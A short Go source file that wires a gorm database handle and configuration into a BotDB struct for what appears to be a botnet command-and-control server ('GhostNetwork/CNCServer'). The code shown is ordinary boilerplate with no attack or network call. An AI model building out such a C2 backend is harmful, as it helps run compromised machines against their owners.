package database

import (
	"github.com/jinzhu/gorm"

	"github.com/bienkma/GhostNetwork/CNCServer/configuration"
)

var seeder *BotDB

type BotDB struct {
	db     *gorm.DB
	config *configuration.CNCConfig
}

// Build container db for pool connection
func Builder(db *gorm.DB, config *configuration.CNCConfig) {
	seeder = &BotDB{db:db, config:config}
}
